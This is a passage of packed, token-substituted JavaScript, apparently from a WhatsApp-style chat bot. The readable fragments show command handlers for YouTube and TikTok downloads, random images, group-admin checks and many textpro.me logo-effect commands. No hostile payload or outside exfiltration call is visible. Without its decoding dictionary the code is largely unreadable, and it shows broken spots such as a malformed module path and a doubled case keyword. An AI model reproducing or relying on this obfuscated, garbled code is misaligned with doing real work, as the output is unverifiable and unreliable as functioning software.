l\'nF\':l\'Mw\':{if(!/2V/.1t(2Y)&&!/2H/.1t(2Y))Q`3a 4E/6I yc 4e 8o To Be yb 4i 4n ${j+K}`if(!H)Q`3a 4E/6I yc 4e 8o To Be yb 4i 4n ${j+K}`m.z(J.1i)B 1S=F H.7h()B{ya}=1P(\'./3k/qO\')B 2H=F ya(1S,\'6q\')C.N(m.E,{2H:2H,3C:\'2H/8n\',cl:2l},{H:m})}G l\'nH\':{if(!H)Q\'3a 3x\'if(!/8m/.1t(2Y))Q`Mv Mu xK Y*${j+K}*`m.z(J.1i)B{bQ}=1P(\'./3k/ge\')B 1S=F C.5v(H)B gG=F bQ(1S)F C.N(m.E,{2V:{R:gG.1E,Y:\'7S y9 To 4E\'},y8:2l},{H:m})F fs.3j(1S)}G l\'nG\':{m.z(J.1i)B{q0,bQ,8Q}=1P(\'./3k/ge\')B 1S=F C.5v(H)if(/U/.1t(2Y)){B 1r=F 8Q(1S)m.z(5C.5g(1r))}1y if(!/U/.1t(2Y)){B 1r=F q0(1S)m.z(5C.5g(1r))}F fs.3j(1S)}G l\'Mt\':l\'oy\':{if(m.1N)Q(\'qN Ms be dE in uR\')if(!D)Q`2o:${j+K}Mr|Mq 2m|1W`1m gF=1s.2t(\' \')1m m1=gF.1h("|")[0]1m m2=gF.1h("|")[1]1m m3=gF.1h("|")[2]B y4={2n:{4K:\'0@s.2d.2q\',...(m.E?{5d:`3t@5V`}:{})},1W:{y7:{2m:`${2u}`,6l:5t}}}B gE=m1+\'@s.2d.2q\'B y5=(\'Mp y6\')B 5j=dg+\'@s.2d.2q\'B me=m.1l B 5u=[gE,5j,me]B c0=`4B 9e:${m2}\\qM:@${gE.1h(\'@\')[0]}\\n\\n${m3}`B 1c=[{1g:\'7i\',1e:{1f:\'🔖¤\'},V:1}]F C.2a(m1+\'@s.2d.2q\',1c,c0,y5,m,{3y:5u,H:y4})B bZ=`4B qL\\y3@${gE.1h(\'@\')[0]}`F C.2a(m.E,1c,bZ,1b,m,{3y:5u})}G l\'8D\':l\'nO\':{if(!D)Q`2o:${j+K}pL wa pY`B 8D=1P("yt-7C")B 7C=F 8D(D)B 1Y=\'dd b2\\n\\n Mo 9e \'+D+\'\\n\\n\'B no=1 1U(B i of 7C.7Y){1Y+=`${1H}No:${no++}\\n${1H}dM:${i.V}\\n${1H}4E ID:${i.y0}\\n${1H}5a:${i.2e}\\n${1H}w5:${i.xZ}\\n${1H}q3:${i.gD}\\n${1H}xY At:${i.xX}\\n${1H}bT:${i.2u.2m}\\n${1H}5Q:${i.R}\\n\\n🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€\\n\\n`}C.N(m.E,{U:{R:7C.7Y[0].6T},Y:1Y},{H:m})}G l\'8C\':{if(!D)Q`2o:${j+K}Mn Mm`B 8C=1P(\'8C-it\')8C({\'2A\':D}).1u(2c=>{B 1Y=`y2 b2 9e:${D}\\n\\n`1U(B g of 2c){1Y+=`${1H}*5a*:${g.2e}\\n`1Y+=`${1H}*qa*:${g.Ml}\\n`1Y+=`${1H}*3v*:${g.1q}\\n\\n🔖”\\n\\n`}m.z(1Y)})}G l\'eW\':{if(!D)Q`2o:${j+K}Mk Mj`1r=F 3H(`S:n=1r.1E dJ=n[1C.2v(1C.1V()*n.1F)]B 1c=[{1g:`eW ${D}`,1e:{1f:\'2p 3x\'},V:1}]B 1R={U:{R:dJ},Y:`*-------Mi eX-------*🔖¤ *9a*:${D}🔖”—*7g 5Q*:${dJ}`,1J:C.2f.2m,1c:1c,1G:4}C.N(m.E,1R,{H:m})}G l\'5h\':l\'Mh\':{if(!D)Q`2o:${j+K}pL wa pY`B 8D=1P("yt-7C")B 7C=F 8D(D)B 1r=7C.y1[1C.2v(1C.1V()*7C.y1.1F)]B 1c=[{1g:`b5 ${1r.R}`,1e:{1f:\'🔊 6I\'},V:1},{1g:`b4 ${1r.R}`,1e:{1f:\'📽️ 4E\'},V:1}]B 1R={U:{R:1r.6T},Y:`${1H}5a:${1r.2e}${1H}qJ:b2 ${1H}ID:${1r.y0}${1H}q3:${1r.gD}${1H}Mg:${1r.xZ}${1H}xY At:${1r.xX}${1H}bT:${1r.2u.2m}${1H}qK:${1r.2u.R}${1H}qa:${1r.3r}${1H}5Q:${1r.R}`,1J:1b,1c:1c,1G:4}C.N(m.E,1R,{H:m})}G l\'b5\':l\'Mf\':{B{xW}=1P(\'./3k/xV\')if(!D)Q`2o:${j+K}S:B 7o=1s[1]?1s[1]:\'qH\'B 1S=F xW(D,7o)if(1S.xT>=xS)L m.z(\'dO gr gq \'+5C.5g(1S))C.g8(m.E,1S.5t,`${1H}5a:${1S.2e}\\n${1H}dO gp:${1S.xQ}\\n${1H}5Q:${9f(D)}\\n${1H}qJ:dR\\n${1H}xP:${1s[1]||\'qH\'}`,m)C.N(m.E,{2H:{R:1S.xR},3C:\'2H/8n\',5I:`${1S.2e}.9c`},{H:m})}G l\'b4\':l\'Me\':{B{xU}=1P(\'./3k/xV\')if(!D)Q`2o:${j+K}S:B 7o=1s[1]?1s[1]:\'qG\'B 1S=F xU(D,7o)if(1S.xT>=xS)L m.z(\'dO gr gq \'+5C.5g(1S))C.N(m.E,{2V:{R:1S.xR},3C:\'2V/6q\',5I:`${1S.2e}.6q`,Y:`${1H}5a:${1S.2e}\\n${1H}dO gp:${1S.xQ}\\n${1H}5Q:${9f(D)}\\n${1H}qJ:dR\\n${1H}xP:${1s[1]||\'qG\'}`},{H:m})}G l\'6s\':{m.z(J.1i)B{6s}=1P(\'./3k/aq\')1r=F 6s(D)1E=1r[1C.2v(1C.1V()*1r.1F)]C.N(m.E,{U:{R:1E},Y:`${1H}7g 5Q:`+1E},{H:m})}G l\'6R\':{m.z(J.1i)1r=F 3H(`S:3b=F 3i(1r.R)B 1c=[{1g:`6R`,1e:{1f:\'2p 3x\'},V:1},{1g:`n0`,1e:{1f:\'🔖Md\'},V:1}]B 1R={U:3b,Y:`aZ Mc`,1J:1b,1c:1c,1G:4}C.N(m.E,1R,{H:m})}G l\'m9\':{m.z(J.1i)B 1r=F 3H(\'S://5K.6i.3z/Mb/Ma/8d/M9.4j\')B 1V=1r[1C.2v(1C.1V()*1r.1F)]C.N(m.E,{U:{R:1V.M8},Y:`xO M7`},{H:m})C.N(m.E,{U:{R:1V.M6},Y:`xO M5`},{H:m})}G l\'eI\':l\'M4\':{B 1c=[{1g:`M3`,1e:{1f:\'2p 3x\'},V:1}]B 1R={U:{R:\'S://eI.M2.M1/1V\'},Y:`🔖˜•aZ M0`,1J:1b,1c:1c,1G:4}C.N(m.E,1R,{H:m})}G l\'5r\':{if(!D)Q\'4c 9a 5a\'B{5r}=1P(\'./3k/aq\')1r=F 5r(D)1E=1r[1C.2v(1C.1V()*1r.1F)]B 1c=[{1g:`5r ${D}`,1e:{1f:\'2p 3x\'},V:1}]B 1R={U:{R:1E.U[0]},Y:`${1H}5a:${1E.2e}\\n${1H}w7:${1E.V}\\n${1H}LZ:${1E.pZ}\\n${1H}7g 5Q:${1E.U[2]||1E.U[1]||1E.U[0]}`,1J:1b,1c:1c,1G:4}C.N(m.E,1R,{H:m})}G l\'xN\':l\'nP\':{if(!D)Q\'4c 9a 5a\'1r=F 3H(`S:n=1r.1E 1E=n[1C.2v(1C.1V()*n.1F)]B xM=`*bV:${1E.9g}\\n*3v:${1E.1q}*`B 1c=[{1g:`xN ${D}`,1e:{1f:\'2p\'},V:1},{1g:\'3w\',1e:{1f:\'🔖™4r\'},V:1}]F C.2a(m.E,1c,xM,1b,m,{H:xL})}G l\'b1\':{if(!D)Q\'4c 9a 5a\'B{b1}=1P(\'./3k/aq\')1r=F b1(D)1E=1r[1C.2v(1C.1V()*1r.1F)]B 1c=[{1g:`b1 ${D}`,1e:{1f:\'2p 3x\'},V:1}]B 1R={U:{R:1E.U},Y:`${1H}5a:${1E.2e}\\n${1H}g7:${1E.pZ}\\n${1H}7g 5Q:${1E.U}`,1J:1b,1c:1c,1G:4}C.N(m.E,1R,{H:m})}G l\'qI\':l\'LY\':{if(!D)Q`2o:${j+K}S:B{qI}=1P(\'./3k) aq\')B 1r=F qI(9f(D)[0])if(1r.V==\'2V\'){B 1c=[{1g:`b5 ${1r.1S[0]}qH`,1e:{1f:\'🔊 6I\'},V:1},{1g:`b4 ${1r.1S[0]}qG`,1e:{1f:\'📽️ 4E\'},V:1}]B 1R={U:{R:1r.2u.LX},Y:`${1H}5a:${1r.2e}${1H}bT:${1r.2u.2m}${1H}xJ:${1r.6k}${1H}4n:${1r.Y}${1H}5Q:${1r.1S[0]}LW eZ 7g LV LU LT gC 7s LS LR LQ LP K b5/b4 xK R LO`,1J:C.2f.2m,1c,1G:4}C.N(m.E,1R,{H:m})}1y if(1r.V==\'U\'){1r.1S.2L(4A(R)=>{C.N(m.E,{U:{R},Y:`${1H}5a:${1r.2e}\\n${1H}bT:${1r.2u.2m}\\n${1H}xJ:${1r.6k}\\n${1H}4n:${1r.Y}`},{H:m})})}}G l\'cA\':{if(!D)Q`2o:${j+K}bX LN`B{cA}=1P(\'./3k/aq\')B 1r=F cA(D)B 1E=1r[1C.2v(1C.1V()*1r.1F)]C.N(m.E,{2H:{R:1E.2H},5I:1E.2e+\'.9c\',3C:\'2H/8n\'},{H:m})}G l\'LM\':l\'6t\':l\'tt\':if(!D)L m.z(\'4c 1n 1q\')B p=F qF.xG.6t(q)B xI=`1I 1a go!🏃🏻‍♂️If 1a 8W 9c,5L 1n 4k 4d`B 1c=[{1g:`xH ${D}`,1e:{1f:\'🔊 6I\'},V:1}]B 1R={2V:{R:p.LL},Y:xI,2e:\'LK qp\',1J:1b,1c:1c,1G:5}C.N(1k,1R,{H:m})G l\'xH\':l\'nQ\':{if(!D)L m.z(\'4c 1n 1q\')B 3l=F qF.xG.6t(D)B xF=`1I 1a go!🏃🏻‍♂️🏃🏻‍♂️`C.N(1k,{Y:xF,U:{R:3l.6T}})C.N(1k,{2H:{R:3l.2H},3C:\'2H/8n\'},{H:m})}G l\'fv\':if(!q)Q\'3U LJ *#fv D*\'C.xE(`${q}`)Q J.4X G l\'LI\':l\'LH\':l\'LG\':l\'LF\':l\'LE\':l\'oz\':l\'LD\':l\'LC\':{if(!m.1N)Q J.1v if(!2M)Q J.3h if(!2G&&!2b)Q J.2r C.LB(m.E)}G l\'d8\':l\'7U\':l\'fc\':l\'fd\':l\'fn\':l\'fm\':l\'LA\':l\'ff\':l\'cW\':l\'b7\':l\'cV\':l\'f5\':l\'qE\':l\'d6\':l\'cU\':l\'a0\':l\'d5\':l\'8G\':l\'.\':l\'fb\':l\'cM\':l\'5G\':l\'fh\':l\'fg\':l\'cT\':l\'8E\':l\'8F\':l\'cS\':l\'a1\':l\'fa\':l\'cX\':l\'gx\':l\'cZ\':l\'cY\':l\'fl\':l\'d4\':l\'d3\':l\'d2\':l\'cK\':l\'bd\':l\'bb\':l\'9Y\':l\'6u\':l\'a3\':l\'a2\':l\'fj\':l\'6S\':l\'fk\':l\'9Z\':l\'d1\':l\'d0\':l\'a4\':l\'7T\':l\'8H\':l\'ba\':l\'cJ\':l\'b9\':l\'cU\':{if(!q)Q`2o:${j+K}${W.6d}`m.z(J.1i)B 1q if(/d8/.1t(K))1q=\'S://Z.me/1T-7U-d8-Lz-D-1w-Ly.1p\'if(/7U/.1t(K))1q=\'S://Z.me/7U-Lx-D-1w-1D-2Z-Lw.1p\'if(/fc/.1t(K))1q=\'S://Z.me/3d-7U-D-1w-by-2m-Lv.1p\'if(/fd/.1t(K))1q=\'S://Z.me/x8-x7-7U-D-1w-x6.1p\'if(/fn/.1t(K))1q=\'S://Z.me/1T-3d-cx-Lu-qs-D-1w-1D-Lt.1p\'if(/fm/.1t(K))1q=\'S://Z.me/1T-3d-x5-fi-D-1w-1D-x4.1p\'if(/gv/.1t(K))1q=\'S://Z.me/3d-gv-x3-x2-D-1w-x1.1p\'if(/ff/.1t(K))1q=\'S://Z.me/1T-3d-Ls-Lr-D-bY-1D-Lq.1p\'if(/cW/.1t(K))1q=\'S://Z.me/1T-6S-a4-D-1w-1D-wV.1p\'if(/b7/.1t(K))1q=\'S://Z.me/1T-a-9W-D-1w-1D-gu.1p\'if(/cV/.1t(K))1q=\'S://Z.me/1T-Lp-cV-5c-D-1w-1D-Lo.1p\'if(/f5/.1t(K))1q=\'S://Z.me/1T-xt-D-bY-1D-2Z-Ln.1p\'if(/qE/.1t(K))1q=\'S://Z.me/Lm-Ll-qE-D-1w-2Z-1D-Lk.1p\'if(/d6/.1t(K))1q=\'S://Z.me/1T-Lj-d6-D-1w-1D-2Z-Li.1p\'if(/cU/.1t(K))1q=\'S://Z.me/1T-gB-d7-5c-D-1w-1D-Lh.1p\'if(/a0/.1t(K))1q=\'S://Z.me/1T-a-a0-D-1w-1D-xB.1p\'if(/d5/.1t(K))1q=\'S://Z.me/1T-d5-D-1w-1D-2Z-Lg.1p\'if(/8G/.1t(K))1q=\'S://Z.me/1D-8G-D-1w-av-xw.1p\'if(/b8/.1t(K))1q=\'S://Z.me/1T-a-b8-cr-D-1w-1D-gw.1p\'if(/fb/.1t(K))1q=\'S://Z.me/1T-a-3d-xx-D-1w-1D-1U-2Z-Lf.1p\'if(/cM/.1t(K))1q=\'S://Z.me/1T-3d-5s-9l-D-1w-1D-xr.1p\'if(/5G/.1t(K))1q=\'S://Z.me/1T-qC-5G-D-bY-1D-qB.1p\'if(/fh/.1t(K))1q=\'S://Z.me/1T-qv-qu-D-1w-1D-qt.1p\'if(/fg/.1t(K))1q=\'S://Z.me/Le-xD-D-1w-2Z-1D-Ld.1p\'if(/cT/.1t(K))1q=\'S://Z.me/1T-dP-bW-gt-D-1w-1D-xC.1p\'if(/8E/.1t(K))1q=\'S://Z.me/1T-a-2Z-1D-8E-D-1w-x0.1p\'if(/8F/.1t(K))1q=\'S://Z.me/1D-8F-3d-bW-gt-D-1w-wT.1p\'if(/cS/.1t(K))1q=\'S://Z.me/1T-5s-xA-xz-D-1w-1D-2Z-xy.1p\'if(/a1/.1t(K))1q=\'S://Z.me/3d-a1-D-1w-av-1D-xf.1p\'if(/fa/.1t(K))1q=\'S://Z.me/1T-b6-7p-dP-D-1w-qq.1p\'if(/cX/.1t(K))1q=\'S://Z.me/1T-cX-D-bY-1U-Lc-Lb-La.1p\'if(/gx/.1t(K))1q=\'S://Z.me/1T-a-gx-D-1w-on-1n-qw-1D-xh.1p\'if(/cZ/.1t(K))1q=\'S://Z.me/cZ-D-1w-L9.1p\'if(/cY/.1t(K))1q=\'S://Z.me/cY-L8-D-1w-L7.1p\'if(/fl/.1t(K))1q=\'S://Z.me/wS-cI-D-1w-wR.1p\'if(/d4/.1t(K))1q=\'S://Z.me/d4-D-1w-L6.1p\'if(/d3/.1t(K))1q=\'S://Z.me/d3-D-1w-L5.1p\'if(/d2/.1t(K))1q=\'S://Z.me/d2-L4-D-1w-L3.1p\'if(/cK/.1t(K))1q=\'S://Z.me/cK-D-1w-1D-L2.1p\'if(/bd/.1t(K))1q=\'S://Z.me/bd-5c-D-1w-1D-xi.1p\'if(/bb/.1t(K))1q=\'S://Z.me/d7-bb-D-1w-1D-L1.1p\'if(/9Y/.1t(K))1q=\'S://Z.me/9Y-D-1w-qD.1p\'if(/6u/.1t(K))1q=\'S://Z.me/6u-D-1w-1D-x9.1p\'if(/a3/.1t(K))1q=\'S://Z.me/a3-D-1w-1D-xa.1p\'if(/a2/.1t(K))1q=\'S://Z.me/a2-D-1w-1D-L0.1p\'if(/fj/.1t(K))1q=\'S://Z.me/bb-D-on-1n-KZ-xD-KY.1p\'if(/6S/.1t(K))1q=\'S://Z.me/6S-wZ-D-1w-wY.1p\'if(/fk/.1t(K))1q=\'S://Z.me/qs-KX-xd-D-1w-1D-KW.1p\'if(/9Z/.1t(K))1q=\'S://Z.me/1T-5b-9Z-1D-xq.1p\'if(/d1/.1t(K))1q=\'S://Z.me/d1-D-1w-1D-KV.1p\'if(/d0/.1t(K))1q=\'S://Z.me/d0-KU-D-1w-KT.1p\'if(/a4/.1t(K))1q=\'S://Z.me/a4-D-1w-1D-KS.1p\'if(/7T/.1t(K))1q=\'S://Z.me/1T-7T-5b-5c-1D-qx.1p\'if(/8H/.1t(K))1q=\'S://Z.me/8X-in-8H-xp-KR-2Z-1D-KQ.1p\'if(/ba/.1t(K))1q=\'S://Z.me/1T-3d-ba-D-1w-3N-xc-5c-xb.1p\'if(/cJ/.1t(K))1q=\'S://Z.me/cJ-5c-D-1w-1D-KP.1p\'if(/b9/.1t(K))1q=\'S://Z.me/cL-b9-D-1w-xn.1p\'B 1r=F 1O.Z(1q,q)C.N(m.E,{U:{R:1r},Y:`1L by ${W.1b}`},{H:m})}G l\'f9\':if(!q)Q`1K ${j+K}D|D`m.z(J.1i)4G=q.1h("|")[0]4F=q.1h("|")[1]1O.Z("S://Z.me/1T-5G-D-1w-5c-g4-xv-xu.1p",[`${4G}`,`${4F}`]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'o8\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/3d-KO-D-1w-1D-KN.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'o7\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/9Y-D-1w-qD.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'o6\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/1T-cP-5b-gy-1D-xs.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'cT\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/1T-dP-bW-gt-D-1w-1D-xC.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'a0\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/1T-a-a0-D-1w-1D-xB.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'o9\':if(!q)Q`1K ${j+K}D|D`m.z(J.1i)4G=q.1h("|")[0]4F=q.1h("|")[1]1O.Z("S://Z.me/1T-qv-qu-D-1w-1D-qt.1p",[`${4G}`,`${4F}`]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'cS\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/1T-5s-xA-xz-D-1w-1D-2Z-xy.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'o4\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/3d-xx-KM-9X-D-1w-KL.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'o5\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/1T-3d-KK-5b-1D-KJ.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'8G\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/1D-8G-D-1w-av-xw.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'cR\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/8X-D-on-cH-cR-1D-2Z-wW.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'ob\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/1T-5s-9l-7T-5b-D-1w-1D-KI.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'7p\':l\'KH\':if(!q)Q`1K ${j+K}D|D`m.z(J.1i)4G=q.1h("|")[0]4F=q.1h("|")[1]1O.Z("S://Z.me/1T-a-9X-7p-D-on-1n-bP-wU.1p",[`${4G}`,`${4F}`]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'KG\':if(!q)Q`1K ${j+K}D`m.z(J.1i)4G=q.1h("|")[0]4F=q.1h("|")[1]1O.Z("S://Z.me/cQ-5c-5b-1D-av-2Z-wQ.1p",[`${4G}`,`${4F}`]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'nW\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/1T-7T-5b-5c-1D-qx.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'5G\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/1T-qC-5G-D-bY-1D-qB.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'o2\':if(!q)Q`1K ${j+K}D|D`m.z(J.1i)4G=q.1h("|")[0]4F=q.1h("|")[1]1O.Z("S://Z.me/1T-a-5G-D-1w-1D-2Z-KF.1p",[`${4G}`,`${4F}`]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'f9\':if(!q)Q`1K ${j+K}D|D`m.z(J.1i)4G=q.1h("|")[0]4F=q.1h("|")[1]1O.Z("S://Z.me/1T-5G-D-1w-5c-g4-xv-xu.1p",[`${4G}`,`${4F}`]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'o1\':if(!q)Q`1K ${j+K}D|D`m.z(J.1i)4G=q.1h("|")[0]4F=q.1h("|")[1]1O.Z("S://Z.me/1T-xt-3d-D-1w-1D-KE.1p",[`${4G}`,`${4F}`]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'cP\':if(!q)Q`1K ${j+K}D|D`m.z(J.1i)4G=q.1h("|")[0]4F=q.1h("|")[1]1O.Z("S://Z.me/1T-cP-5b-gy-1D-xs.1p",[`${4G}`,`${4F}`]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'o0\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/1T-3d-5s-9l-D-1w-1D-xr.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'5s\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/5s-D-1w-1D-KD.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'nZ\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/gB-5s-D-1w-KC.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'f8\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/f8-D-1w-KB.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'f7\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/f7-3d-D-1w-KA.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'cO\':if(!q)Q`1K ${j+K}D`m.z(J.1i)4G=q.1h("|")[0]4F=q.1h("|")[1]1O.Z("S://Z.me/1D-bX-2W-xk-cO-gy-5b-qy-xj.1p",[`${4G}`,`${4F}`]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'cN\':if(!q)Q`1K ${j+K}D`m.z(J.1i)4G=q.1h("|")[0]4F=q.1h("|")[1]1O.Z("S://Z.me/1T-cN-5b-xo-1D-Kz.1p",[`${4G}`,`${4F}`]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'9Z\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/1T-5b-9Z-1D-xq.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'nY\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/9Y-D-1w-qD.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'o3\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/1T-a-xp-5s-9l-D-1w-1D-Ky.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'nV\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/5s-9l-D-1w-3N-xo-5c-Kx.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'nX\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/G-bP-D-1w-Kw.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'cL\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/cL-b9-D-1w-xn.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'f6\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/f6-D-1w-Kv.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'b7\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/1T-a-9W-D-1w-1D-gu.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'oa\':{if(1s.1F<1)Q`2o:\\n${j+K}<2m>`if(1s[0]===\'5G\'){if(1s.1F<2)Q`2o:\\n${j+K+\' \'+1s[0]}${W.6d}`B gA=F xm.Z("S://Z.me/1T-qC-5G-D-bY-1D-qB.1p",[1s[1]])C.N(1k,{U:{R:gA},Y:"dQ!"},{H:m})}1y if(1s[0]===\'qA\'){if(1s.1F<2)Q`2o:\\n${j+K+\' \'+1s[0]}${W.6d}`B gA=F xm.Z("S://Z.me/1T-9l-qA-Ku-D-1w-1D-Kt.1p",[1s[1]])C.N(1k,{U:{R:gA},Y:"dQ!"},{H:m})}1y{m.z(`*gz od 3L:*\\n🔖€¢>5G\\n🔖€¢>qA`)}}G l\'f2\':{B 1q=`S:B qz=F Z(1q,q)m.z(`xl a 8i u8 Ks 1n 5b Kr 1 Kq`)1z.1B(qz)C.N(1k,{U:{R:qz},Y:"1I 1a go! 🏃🏻‍♂️ 🏃🏻‍♂️"},{H:m})}G l\'nT\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/1D-bX-2W-xk-cO-gy-5b-qy-xj.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'Kp\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/1T-8G-D-1w-1D-Ko.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G G l\'7T\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/1T-7T-5b-5c-1D-qx.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'5s\':if(!q)Q`1K ${j+K}D`m.z(J.1i)1O.Z("S://Z.me/5s-9l-D-1w-1D-Kn.1p",[`${q}`,]).1u((M)=>C.N(m.E,{U:{R:M},Y:`1L by ${W.1b}`},{H:m})).1j((P)=>1z.1B(P));G l\'Km\':if(!q)Q`1K 